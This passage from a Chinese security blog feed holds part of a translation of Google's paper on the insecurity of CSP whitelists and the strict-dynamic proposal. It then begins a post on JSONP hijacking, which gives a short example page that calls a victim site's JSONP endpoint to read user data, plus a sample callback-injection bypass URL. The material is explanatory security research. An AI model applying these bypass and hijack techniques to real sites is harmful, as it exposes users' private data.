alt="此处输入图片的描述"></p><p><strong>由于这种行为以及复杂Web应用程序中重定向器的普遍存在（通常用于OAuth等安全上下文中并防止引用泄漏），因此不能依赖路径限制作为CSP中的安全机制。</strong></p><p>我们已经展示了一些看似良性的编程模式如何允许内容注入攻击者绕过CSP提供的脚本执行保护，从而消除策略的任何反XSS优势{其主要关注点。我们现在转而分析这种绕道对现实世界政策的影响。</p><h2 id="CSP的实证研究"><a href="#CSP的实证研究" class="headerlink" title="CSP的实证研究"></a><strong>CSP的实证研究</strong></h2><p>我们的工作目标是调查CSP在实践中提供的一般方法和保护能力。为此，我们进行了大规模的实证研究，以收集和分析现实世界的CSP策略。在本节中，我们描述了本研究的方法和结果。</p><h3 id="问题研究"><a href="#问题研究" class="headerlink" title="问题研究"></a><strong>问题研究</strong></h3><p>我们的研究分为两个主要部分。首先，我们的目标是了解CSP目前的使用情况;第二，我们要分析已部署策略的安全属性。</p><h4 id="CSP如何在web上使用？"><a href="#CSP如何在web上使用？" class="headerlink" title="CSP如何在web上使用？"></a><strong>CSP如何在web上使用？</strong></h4><p>正如先前的研究所示，CSP采用率落后于安全社区的期望。因此，在我们的研究的第一部分，我们旨在阐明CSP的当前状态，以了解CSP的使用范围。此外，<strong>我们想了解CSP是专门用于XSS保护还是其他普遍存在的用例</strong>。由于许多主要的Web应用程序需要更改为与CSP兼容，因此尚不清楚CSP策略是否已用于XSS保护，或处于相当实验状态，其中仍然禁用强制执行。因此，我们感兴趣的是执行模式中的策略与仅报告模式下的策略之间的比率。在本研究的第二部分中，我们将使用强制策略进行安全性分析。</p><h4 id="现实世界的CSP政策有多安全？"><a href="#现实世界的CSP政策有多安全？" class="headerlink" title="现实世界的CSP政策有多安全？"></a><strong>现实世界的CSP政策有多安全？</strong></h4><p>如第2节所述，有很多缺陷可能会使策略的保护能力无效。避免策略制定中的这些错误需要广泛的知识。在我们研究的第二部分，<strong>我们的目标是确定有多少策略是由错误影响的，因此可以绕过</strong>。我们还调查哪种错误最为普遍。此外，<strong>我们的目标是分析严格策略的安全性，特别是白名单的安全性。</strong></p><h3 id="方法论"><a href="#方法论" class="headerlink" title="方法论"></a><strong>方法论</strong></h3><p>在以下小节中，我们概述了用于从给定数据集中提取和分析内容安全策略的方法。</p><h4 id="检测内容安全策略"><a href="#检测内容安全策略" class="headerlink" title="检测内容安全策略"></a><strong>检测内容安全策略</strong></h4><p>为了从数据集中提取CSP策略，我们编写了一个系统。对于具有CSP策略的索引中的每个URL，我们提取了以下元组：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A58.png" alt="此处输入图片的描述"></p><p>基于此元组列表，<strong>我们为每个主机提取了一组唯一策略</strong>，有效地删除了每个主机上的重复策略。</p><h4 id="规范化CSP策略"><a href="#规范化CSP策略" class="headerlink" title="规范化CSP策略"></a><strong>规范化CSP策略</strong></h4><p>多个网站自动生成包含随机nonces，hashes 或 report URIs 的CSP策略。在此过程中，某些生成例程会随机切换某些指令或指令值的顺序。为了使我们的数据集中的策略具有可比性，我们首先对策略进行了规范化。我们按照规范1中的描述实现了一个CSP解析器，并存储了每个CSP的解析副本，以便以后进行深入评估。对于每个策略，我们应用了以下规范化步骤：</p><ul><li>首先，我们删除了多余的空格并用柔性占位符替换所有变量值，例如nonces和report URIs。</li><li>其次，我们对所有指令和指令值进行了排序和重复数据删除。</li></ul><h4 id="重复编写CSP"><a href="#重复编写CSP" class="headerlink" title="重复编写CSP"></a><strong>重复编写CSP</strong></h4><p>在我们的分析过程中，我们发现消息板和电子商务平台等现成的Web应用程序分布在许多不同的主机上，同时部署完全相同的CSP策略。为解决此问题，我们决定根据规范化的策略字符串对CSP进行重复数据删除。因此，我们的最终数据集包含我们在网络上找到的每个唯一策略的单个条目。</p><h4 id="确定XSS保护策略"><a href="#确定XSS保护策略" class="headerlink" title="确定XSS保护策略"></a><strong>确定XSS保护策略</strong></h4><p>如前所述，CSP支持许多主要用于防御XSS的指令，例如img-src和frame-ancestors。由于我们的研究旨在评估策略在XSS缓解能力方面的安全性，因此我们需要一种方法来区分试图抵御XSS的策略与所有其他策略。根据我们的定义，XSS保护策略必须处于强制模式，并且必须至少包含以下两个指令之一：script-src或default-src</p><h4 id="评估政策的安全性"><a href="#评估政策的安全性" class="headerlink" title="评估政策的安全性"></a><strong>评估政策的安全性</strong></h4><p>为了评估是否可以绕过CSP策略来执行攻击者控制的脚本，我们进行以下检查：</p><h5 id="1-使用-‘unsafe-inline’"><a href="#1-使用-‘unsafe-inline’" class="headerlink" title="1.使用 ‘unsafe-inline’:"></a><strong>1.使用 ‘unsafe-inline’:</strong></h5><p>如果没有指定脚本随机数，那么带有’unsafe-inline’关键字的策略本质上是不安全的。这样的策略是被视为可绕行的。</p><h5 id="2-缺少-object-src"><a href="#2-缺少-object-src" class="headerlink" title="2.缺少 object-src:"></a><strong>2.缺少 object-src:</strong></h5><p>指定script-src但缺少object-src指令**（并且未设置default-src）<strong>的策略</strong>允许通过注入插件资源来执行脚本**，如清单3所示。</p><h5 id="3-在白名单中使用通配符："><a href="#3-在白名单中使用通配符：" class="headerlink" title="3.在白名单中使用通配符："></a><strong>3.在白名单中使用通配符：</strong></h5><p>如果安全相关的白名单包含通用通配符或URI方案（http:, https: or data:），<strong>则允许包含来自任意主机的内容</strong>，则策略也是不安全的。</p><h5 id="4-白名单中的不安全来源："><a href="#4-白名单中的不安全来源：" class="headerlink" title="4.白名单中的不安全来源："></a><strong>4.白名单中的不安全来源：</strong></h5><p><strong>当托管具有CSP旁路的端点的域列入白名单时，CSP的保护功能将变为无效</strong>。为了评估策略的安全性，我们编译了具有这种可绕过端点的主机列表。如果给定策略的白名单条目出现在此列表中，我们<br>政策是可绕过的。在下一节中，我们将概述如何创建此列表。</p><h4 id="使用允许CSP-byasses的端点标识域"><a href="#使用允许CSP-byasses的端点标识域" class="headerlink" title="使用允许CSP byasses的端点标识域"></a><strong>使用允许CSP byasses的端点标识域</strong></h4><p>为了识别CSP中白名单不安全的域，我们从搜索索引中提取了之前描述的实践之一的页面。如前所述**，托管AngularJS库并公开JSONP端点是创建CSP绕过的众多方法中的两种。**</p><h5 id="JSONP-端点"><a href="#JSONP-端点" class="headerlink" title="JSONP 端点"></a><strong>JSONP 端点</strong></h5><p>为了识别JSONP端点，我们从搜索索引中提取了包含GET参数的所有URL，其中包含以下名称之一：callback，cb，json，jsonp。</p><p>随后，我们通过更改相应参数的值，请求资源并且检查更改的值是否能在返回值的开头反射出来，从而验证结果数据集</p><p>我们通过验证响应中允许的字符来检查所有端点是否允许完整的XSS或SOME攻击。根据我们的数据，39％的JSONP绕过允许任意JS执行，而其余的允许通过SOME攻击任意调用现有函数，在实际应用程序中被认为与完整XSS一样有害。</p><h5 id="AngularJS："><a href="#AngularJS：" class="headerlink" title="AngularJS："></a><strong>AngularJS：</strong></h5><p>对于AngularJS库，我们创建了一个小签名，该签名与源代码的特定部分（迷你版和非迷你版）相匹配。对于每个匹配，我们然后通过匹配包含的版本字符串来提取文件的版本。</p><h3 id="结果与分析"><a href="#结果与分析" class="headerlink" title="结果与分析"></a><strong>结果与分析</strong></h3><h4 id="网络上的CSP状态"><a href="#网络上的CSP状态" class="headerlink" title="网络上的CSP状态"></a><strong>网络上的CSP状态</strong></h4><p>我们使用Google的一个索引作为检测CSP策略的数据集。在此分析时，此特定索引包含大约1060亿个唯一URL，跨越10亿个主机名和1.75亿个顶级私有域.3我们认为此索引代表了当前的Web状态，因为所有URL都是由在我们分析前约20天的时间范围内使用Google抓取工具。</p><p>在此数据集中，我们发现3,913,578,446（3.7％）个网址带有CSP政策。但是，这个数字并不是CSP采用率的良好近似值，因为具有大量URL的应用程序可能在整个数据集中过多。在考虑跨域分布时，总体情况看起来不同：274,214个顶级私有域中仅有1,664,019（0.16％）的所有主机名都部署了CSP策略。在此列表中，仅使用少数不同的策略将100万个主机名映射到ve-commerce4应用程序之一。为了解决这个问题，我们使用规范化策略对数据集进行了重复数据删除。通过这样做，我们确定了26,011个独特的政策。</p><h4 id="CSP-如何被使用"><a href="#CSP-如何被使用" class="headerlink" title="CSP 如何被使用"></a><strong>CSP 如何被使用</strong></h4><p>它有许多其他用例。因此，作为第一步，我们试图确定CSP是否用于其预期目的。图1显示了所有CSP指令的列表，按发生次数排序。该列表清楚地显示了script-src and&#x2F;or default-src 指令在大多数策略中使用。相比之下，frame-ancestors指令，可用于控制框架行为页面的使用仅在8.1％的策略中使用。此外，在26,011个唯一策略中，只有9.96％处于仅报告模式，而其他90.04％处于强制模式。在这些数字中，我们看到明确的证据表明CSP意味着XSS保护。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A59.png" alt="此处输入图片的描述"></p><h4 id="CSP的一般安全性"><a href="#CSP的一般安全性" class="headerlink" title="CSP的一般安全性"></a><strong>CSP的一般安全性</strong></h4><p>为了评估检测到的CSP策略的安全属性，我们自动应用了之前的检查。基于对配置和白名单可绕行性的分析，我们观察到整个数据集中94.72％的策略不受XSS的任何保护。</p><p>重要的是要注意，其中一些策略不处于强制模式或不用于防止XSS;然而，即使对于XSS保护政策，可绕过政策的百分比也非常相似：94.68％。</p><p>不幸的是，<strong>大多数策略本质上都是不安全的</strong>。在XSS保护策略中，87.63％使用’unsafe-inline’关键字而未指定nonce，<strong>这实际上禁用了CSP的保护功能。</strong></p><p>这个高的令人惊讶的数字可能是因为<strong>许多Web应用程序需要重写其大部分代码才能与CSP兼容</strong>。<strong>其中一些页面可能仍处于过渡阶段，需要使用“unsafe-inline”关键字</strong>。虽然从长远来看这个问题可能会被解决，但许多策略都包含其他明显的问题。例如，我们确定<strong>9.4％的策略既不包含default-src，也不包含object-src指</strong>令。因此，攻击者可以通过<strong>注入能够执行JavaScript的恶意Flash对象来利用XSS漏洞</strong>。此外，21.48％的策略在script-src或default-src指令中使用通用通配符或URI方案（http：或https:)，因此允许包含来自任意，可能受攻击者控制的主机的脚本。</p><p>鉴于这些值，似乎绝大多数策略都无法有效地防范XSS攻击。但是，由于CSP可能不成熟，因此早期采用问题可能会导致数字偏大。为了解释这一事实，我们编制了一套策略不包含微不足道的问题，例如’unsafe-inline’关键字或白名单中的通用通配符。总计，我们找到了符合这些条件的2,437条策略。我们观察到，通过我们的自动策略分析工具，我们仍然能够绕过这些严格策略的51.05％。</p><p>虽然这些旁路中的一些是由缺少 object-src 和 default-src 指令引起的，但大多数旁路是由script-src白名单中的不安全起源引起的。在下一节中，我们将详细讨论我们对白名单的分析。</p><h4 id="白名单安全性"><a href="#白名单安全性" class="headerlink" title="白名单安全性"></a><strong>白名单安全性</strong></h4><p><strong>对于白名单中的每个主机，维护者需要确保攻击者无法注入恶意内容</strong>，这些内容可以通过<code>&lt;script&gt;</code>或<code>&lt;object&gt;</code>标记包含在内。如前所述，JSONP端点和AngularJS库是实现此目的的众多方法中的两种。如果即使只有一个域暴露这样的端点，CSP的反XSS功能也会变得无用。因此，<strong>白名单越大，维护相应政策的安全性就越困难。</strong></p><p>作为我们分析的结果，<strong>我们得出结论，在传统的基于白名单的模型中部署CSP以防止XSS是不可行的，因为在实践中通常会破坏脚本执行限制。我们建议在第4节中通过制定CSP策略来解决此问题的方法，该策略用脚本nonces替换域白名单</strong></p><h2 id="CSP-提升"><a href="#CSP-提升" class="headerlink" title="CSP 提升"></a><strong>CSP 提升</strong></h2><p>实际上，目前使用CSP的绝大多数网站都部署了一项不对XSS提供安全保护的策略。 除了明显的配置问题（具有’unsafe-inline’的策略和未指定object-src的策略），策略不安全的主要原因是script-src白名单的可绕行性。 </p><p>在现代网络上，基于白名单域的方法（即使伴随路径）似乎过于灵活，无法很好的让开发人员阻止XSS。</p><p>与此同时**，CSP已经提供了更细粒度的授予脚本信任的方法：加密 nonces和hashes**。特别是，nonces允许开发人员显式地注释每个可信脚本（内联和外部），同时禁止执行攻击者注入的脚本。</p><p>为了提高CSP的整体安全性，我们提出了一种略微不同的编写策略的方法。应用程序维护人员应该应用基于nonces的保护方法，<strong>而不是依赖于白名单</strong>。以下清单描述了基于白名单的CSP策略和满足此策略的脚本：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A510.png" alt="此处输入图片的描述"></p><p>不幸的是，此策略的白名单<strong>包含一个不安全的主机，因此描述的策略是不安全</strong>的。攻击者可以通过注入具有以下URL的脚本来滥用JSONP端点：<a href="https://example.org/script.js?callback=">https://example.org/script.js?callback=</a> malicious_code。</p><p>为避免此问题，我们建议以下列方式重写此类策略：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A511.png" alt="此处输入图片的描述"></p><p>通过使用 nonce ，脚本可以单独列入白名单。<br><strong>即使攻击者能够找到XSS，nonce值也是不可预测的，因此攻击者无法注入指向JSONP端点的有效脚本。</strong></p><p>CSP的一个有用功能是它允许集中执行安全决策。例如，安全团队可能会使用CSP来强制执行一组允许加载脚本的可信主机，而不是依赖开发人员的善意而不包括来自不受信任站点的脚本。然而，在单一的基于随机数的策略中，这是不可能的;资源只需要遵循白名单或随机数。因此，将白名单添加到基于随机数的策略会消除的优点。<strong>有趣的是，浏览器允许执行多个策略。如果为页面指定了两个策略，则浏览器会确保资源遵循这两个策略。（这一点在 2018 TCTF 的一道题中就涉及到了，两个同名的策略都有效）<strong>因此，此功能可用于获得两个方面的好处：<strong>一个基于nonces的策略可用于将单个脚本列入白名单</strong>，而另一个</strong>基于白名单的策略可用于集中执行安全决策</strong>。通过用逗号分隔两个策略，可以在同一个HTTP响应头中将这两个策略传送到客户端：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A512.png" alt="此处输入图片的描述"></p><p>然而，<strong>当通过JavaScript将新脚本添加到页面时</strong>，会出现基于随机数的策略的另一个问题：因为JS库可能不知道CSP并且不知道正确的CSP 随机数，<strong>所以CSP将阻止动态插入的脚本执行，部分应用程序将失败。</strong></p><p>在不依赖源列表的情况下，我们为script-src提出了一个新的源表达式：’strict-dynamic’。 ‘strict-dynamic’是CSP3规范草案5，在Chrome和Opera中实现。我们在后面会描述了一个流行的生产应用程序中的采用过程和结果。</p><h3 id="将信任传播到动态脚本"><a href="#将信任传播到动态脚本" class="headerlink" title="将信任传播到动态脚本"></a><strong>将信任传播到动态脚本</strong></h3><p>在script-src源列表中添加建议的’strict-dynamic’关键字会产生以下后果：</p><ul><li><strong>允许动态添加的脚本执行</strong>。实际上，这意味着策略将允许document.createElement(‘script’)创建的脚本节点，无论它们加载的URL是否在script-src白名单中。</li><li><strong>其他script-src白名单条目将被忽略</strong>。除非伴随有效的nonce，否则浏览器不会执行静态或解析器插入的脚本</li></ul><p>这种方法背后的核心点是，<strong>通过调用createElement()添加的脚本已经被应用程序信任(开发人员明确选择加载和执行它们)</strong>。另一方面，发现标记注入bug的攻击者**无法在不首先执行JavaScript的情况下直接调用createElement();**并且攻击者无法在不知道策略中定义的适当nonce的情况下注入恶意脚本并执行JavaScript。</p><p>这种使用CSP的方式有望实现基于nonce的策略，其中执行脚本的能力由开发人员通过在可信脚本上设置nonce来控制，并允许信任通过设置’strict-dynamic’传播到下标。</p><p>例如，开发人员可以设置类似于以下内容的策略：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A513.png" alt="此处输入图片的描述"></p><p>使用这样的策略，所有者需要向静态<code>&lt;script&gt;</code>元素添加nonce，但是可以确保只有这些可信脚本及其后代才会执行。</p><p>这种部署CSP的模式可以显着提高策略的安全性并促进采用。</p><h3 id="strict-dynamic-案例研究"><a href="#strict-dynamic-案例研究" class="headerlink" title="strict-dynamic 案例研究"></a><strong>strict-dynamic 案例研究</strong></h3><p>2015年2月，我们在Google地图活动中采用了基于白名单的强制执行内容安全政策，这是一个由400万月活跃用户使用的复杂且重量级的JavaScript网络应用程序。我们从一个简单的策略开始，包括一个nonce和整个origin，但必须逐步扩展它(在整个2015年进行5次重大更改)以应对应用程序，API和库中的更改，同时保持白名单路径的安全性和限制性可能。为了避免生产中断，我们不得不定期更新origin<br>来对API和内容服务基础架构的更改。这导致了script-src白名单的大小爆炸：它增长到15条长路径，遗憾的是仍然必须包含至少一个JSONP端点，从而在XSS保护方面损害了策略的有效性。</p><p>由于标记中的脚本已经到位，因此从基于白名单的方法切换到具有“strict-dynamic”的非常规策略不需要重构。该交换机还允许我们大幅简化策略，避免破坏，同时使其更安全，更易于维护(事实上，从那时起我们就不必对策略进行更改)。</p><p>到目前为止，我们已经在Google照片，云控制台，历史记录，文化学院和其他机构中部署了一个仅限于nonce-only的政策，其中包含“strict-dynamic”和非常少的电子邮件。</p><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a><strong>限制</strong></h3><p><strong>使用“strict-dynamic”的基于随机数的策略可以提供更安全，更易于部署的CSP，但它们并不是XSS的灵丹妙药。作者仍需要注意安全性和兼容性方面的考虑因素：</strong></p><h4 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a><strong>安全性</strong></h4><ul><li><p>注入动态创建的脚本的src属性：使用’strict-dynamic’，如果XSS错误的根本原因是将不受信任的数据注入到传递给通过createElement()创建的脚本的src属性的URL中API，该bug将变得可利用，而使用基于白名单的策略，脚本的位置将仅限于策略中允许的源。</p></li><li><p>注入<code>nonced &lt;script&gt;</code>：如果注入点位于开发人员信任的  <code>&lt;script&gt;</code>内，则攻击者将能够无限制地执行其恶意脚本。但是，传统政策仍然可以实现这一点。</p></li><li><p>post-XSS&#x2F;scriptless 攻击：即使策略阻止攻击者在应用程序的上下文中执行任意脚本，其他有限但也具有破坏性的攻击仍可能。</p></li></ul><h4 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a><strong>兼容性</strong></h4><ul><li><p>解析器插入的脚本：如果应用程序使用诸如document.write()之类的API来动态添加脚本，即使它们指向列入白名单的资源，它们也会被“strict-dynamic”阻止。采用者必须重构此类代码以使用其他API（如createElement()），或者将nonce显式传递给使用document.write()创建的<code>&lt;script&gt;</code>元素。</p></li><li><p>内联事件处理程序：’strict-dynamic’不会消除删除与CSP不兼容的标记的耗时过程，例如javascript：URI或内联事件处理程序。在采用CSP之前，开发人员仍需要重构这些模式。</p></li></ul><p>尽管存在这些警告，但基于对Google内部数据集中数百个XSS错误的分析，我们预计大部分XSS将使用基于随机数的策略进行缓解，并且采用此类策略对于开发人员而言要比基于白名单的传统方法。</p><h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a><strong>相关工作</strong></h2><p>2007年发表了第一篇提出将脚本列入白名单以阻止注入攻击的论文之一。名为Browser-Enforced Embedded Policies（BEEP）的系统旨在根据应用程序所有者提供的策略限制浏览器级别的脚本包含。与BEEP相似，Oda等。提出了SOMA，它将BEEP的思想从脚本扩展到其他Web资源。Stamm等人提出了这些想法。谁发布了最初的CSP论文，称为“Reining in the Web with Content Security Policy”。之后，CSP被几家浏览器厂商和标准化委员会选中。2011年，Firefox 以及Chromium 发布第一个实验原型。随后，CSP的几个迭代已经标准化并发布。</p><p>最初，CSP受到了很多关注，许多网站开始尝试使用它。但是，由于CSP需要大规模更改，因此采用率仍然很小。 2014年，Weissbacher等人。发表了关于采用CSP的第一项研究。在他们的研究中，他们发现前100个网页中只有1％使用了CSP。为了探究这种低采用率背后的原因，他们通过将CSP策略部署到三个不同的站点进行了实验</p><p>因此，他们发现创建初始策略非常困难，因为安全策略需要对现有应用程序进行大量更改。Doup等人研究了这个问题。他们的系统名为deDacota，采用自动代码重写来外化内联脚本。这反过来又使他们的系统能够自动将CSP策略部署到给定的应用程序。</p><p>Kerschbaumer等旨在解决类似的问题。他们观察到许多页面使用了不安全的“unsafe-inline”关键字，以避免重写其应用程序。因此，Kerschbaumer等。创建了一个系统，通过众包学习方法自动生成CSP策略。随着时间的推移，他们的系统学习了多个用户观察到的合法脚本，并确保只有这些合法脚本通过脚本哈希在策略中列入白名单。</p><p>约翰斯研究了CSP中的另一个问题。在他的论文中，他解决了由动态生成的脚本引起的安全问题。为了应对类似JSONP的端点所施加的威胁，他建议不要根据脚本的来源将脚本列入白名单，而是根据校验和将脚本列入白名单;即脚本的哈希值。但是，这种方法仅适用于静态文件，而不适用于JSONP等动态文件。因此，他提出了一种脚本模板机制，允许开发人员将动态数据值与静态代码分开。通过这种方式，可以为其静态部分计算脚本的哈希值，同时它仍然能够包含动态数据值。</p><p>Hausknecht等人的另一篇论文。调查浏览器扩展和CSP之间的紧张关系。作者对Chrome网上商店的浏览器扩展进行了大规模研究，发现许多扩展程序都篡改了网页的CSP。因此，他们提出了一种认可机制，允许扩展程序在更改安全策略之前请求网页获得许可。</p><p>在第4节中，我们提出了一种编写CSP策略的新方法。我们建议使用脚本nonce而不是白名单。之前已经提出使用随机数来防止XSS的想法。第一篇论文提出了一个名为Noncespaces的系统。 </p><p>Noncepaces会自动为合法的HTML标记添加随机XML命名空间。如果应用程序中发生注入漏洞，则攻击者无法预测此随机命名空间，因此无法注入有效的脚本标记。</p><p>另一个掌握指令集随机化思想的系统是xJs。xJS使用在服务器和浏览器之间共享的密钥对所有合法的JavaScript代码进行异或，并为每个请求刷新。由于浏览器在运行时解密脚本并且攻击者无法知道密钥，因此无法创建有效的漏洞利用负载。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>在本文中，我们基于大规模的实证研究，对在实际应用中采用CSP的实际安全性评估进行了评估。</p><p>我们对CSP的安全模型进行了深入分析，并确定了几个看似安全的策略没有提供安全性改进的情况。我们调查了超过10亿个主机名采用CSP，并使用Google搜索索引中的26,011个独特政策识别了160万个主机。</p><p>不幸的是，这些政策中的大多数本质上都是不安全的。通过自动检查，我们能够证明94.72％的所有策略都可以被具有标记注入错误的攻击者轻易绕过。此外，我们分析了白名单的安全属性。因此，我们发现75.81％的所有政策和41.65％的所有严格政策在其白名单中至少包含一个不安全的主机。这些数字使我们相信白名单在CSP政策中使用是不切实际的。</p><p>因此，我们提出了一种新的政策写作方式。我们建议通过基于CSP nonce的方法启用单个脚本，而不是将整个主机列入白名单。</p><p>为了简化基于随机数的CSP的采用，我们还提出了“严格动态”关键字。一旦在CSP策略中指定，此关键字使浏览器内的模式能够将nonce继承到动态脚本。</p><p>因此，如果使用nonce信任的脚本在运行时创建新脚本，则此新脚本也将被视为合法。</p><p>虽然这种技术背离了CSP的传统主机白名单方法，但我们认为可用性的改进足明其广泛采用的合理性。</p><p>由于这是一种选择加入机制，因此默认情况下不会降低CSP的保护功能。</p><p>我们希望基于随机数的方法和“严格动态”关键字的结合将使开发人员和组织能够真正享受内容安全策略带来的真正安全性。</p><h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a>原文链接</h2><p><a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf">https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>翻译</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JSONP 劫持原理与挖掘方法</title>
    <link href="/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/"/>
    <url>/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>最近打算看一些前端方面的东西，琢磨着从哪里开始看起，正好想到之前我还有一篇 <a href="https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/">由浅入深理解 jsonp 并拓展</a> 这样的文章，主要介绍的是 jsonp 的概念，利用思路还没有讲，于是干脆就接着写这个话题吧。</p><h2 id="0X01-什么是-JSONP-劫持"><a href="#0X01-什么是-JSONP-劫持" class="headerlink" title="0X01 什么是 JSONP 劫持"></a><strong>0X01 什么是 JSONP 劫持</strong></h2><p>由于之前的那篇文章已经详细介绍过 jsonp 的工作原理，所以这里就不再详细介绍原理了，就简单的说一下：</p><p><strong>JSONP</strong> 就是为了跨域<strong>获取资源</strong>而产生的一种<strong>非官方</strong>的技术手段(官方的有 CORS 和 postMessage),它利用的是 script 标签的 src 属性不受同源策略影响的特性，</p><span id="more"></span><p>那么<strong>劫持</strong>又是怎么回事呢？其实我们在学安全的过程中对劫持这个词可以说是一点也不陌生，我们遇到过很多的劫持的攻击方法，比如：dns 劫持、点击劫持、cookie劫持等等，也正如劫持这个词的含义：“拦截挟持”，dns 劫持就是把 dns 的解析截获然后篡改，点击劫持就是截获你的鼠标的点击动作，在用户不知情的情况下点击攻击者指定的东西，cookie 劫持就是获取用户的 cookie，然后可以进一步伪造身份，那么同样， jsonp 劫持就是攻击者获取了本应该传给网站其他接口的数据</p><h2 id="0X02-JSONP-漏洞的利用过程及危害"><a href="#0X02-JSONP-漏洞的利用过程及危害" class="headerlink" title="0X02 JSONP 漏洞的利用过程及危害"></a><strong>0X02 JSONP 漏洞的利用过程及危害</strong></h2><p>通过JSONP技术可以实现数据的跨域访问，必然会产生安全问题，如果网站B对网站A的JSONP请求没有进行安全检查直接返回数据，则网站B 便存在JSONP 漏洞，网站A 利用JSONP漏洞能够获取用户在网站B上的数据。</p><h3 id="1-JSONP漏洞利用过程如下："><a href="#1-JSONP漏洞利用过程如下：" class="headerlink" title="1.JSONP漏洞利用过程如下："></a><strong>1.JSONP漏洞利用过程如下：</strong></h3><p>1）用户在网站B 注册并登录，网站B 包含了用户的id，name，email等信息；<br>2）用户通过浏览器向网站A发出URL请求；<br>3）网站A向用户返回响应页面，响应页面中注册了JavaScript的回调函数和向网站B请求的script标签，示例代码如下：</p><pre><code class="hljs">&lt;script type=&quot;text/javascript&quot;&gt;function Callback(result)&#123;    alert(result.name);&#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://B.com/user?jsonp=Callback&quot;&gt;&lt;/script&gt;</code></pre><p>4）用户收到响应，解析JS代码，将回调函数作为参数向网站B发出请求；<br>5）网站B接收到请求后，解析请求的URL，以JSON 格式生成请求需要的数据，将封装的包含用户信息的JSON数据作为回调函数的参数返回给浏览器，网站B返回的数据实例如下：</p><pre><code class="hljs">Callback(&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;&#125;)。</code></pre><p>6）网站B数据返回后，浏览器则自动执行Callback函数对步骤4返回的JSON格式数据进行处理，通过alert弹窗展示了用户在网站B的注册信息。另外也可将JSON数据回传到网站A的服务器，这样网站A利用网站B的JSONP漏洞便获取到了用户在网站B注册的信息。</p><h3 id="2-JSONP-漏洞利用过程示意图"><a href="#2-JSONP-漏洞利用过程示意图" class="headerlink" title="2.JSONP 漏洞利用过程示意图"></a><strong>2.JSONP 漏洞利用过程示意图</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%951.png" alt="此处输入图片的描述"></p><h3 id="3-JSONP-劫持漏洞的危害"><a href="#3-JSONP-劫持漏洞的危害" class="headerlink" title="3.JSONP 劫持漏洞的危害"></a><strong>3.JSONP 